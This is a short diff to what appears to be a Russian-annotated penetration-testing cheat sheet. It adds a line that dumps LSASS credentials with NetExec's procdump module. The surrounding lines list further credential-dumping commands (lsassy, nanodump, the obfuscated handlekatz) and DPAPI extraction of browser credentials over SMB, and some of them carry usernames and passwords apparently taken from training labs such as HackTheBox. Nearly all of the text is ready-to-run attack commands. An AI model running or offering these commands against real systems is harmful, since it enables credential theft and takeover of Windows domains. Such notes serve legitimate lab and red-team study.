@@ -128,7 +128,9 @@
 		(тоже)	nxc smb dc1.corp.com -u 'administrator' -p 'password' -M lsassy	
 
 		(тоже но скрытнное)	nxc smb 10.10.11.76 -u user -p pass -M nanodump		
-
+		
+		(тоже но скрытнное) nxc smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M procdump
+		
 		(тоже еще и обфусцированое) crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M handlekatz
 		
 		((получение кредов из браузеров))	mxc smb ss.banki.htb -u boss -p "password" -d banki.htb --dpapi			
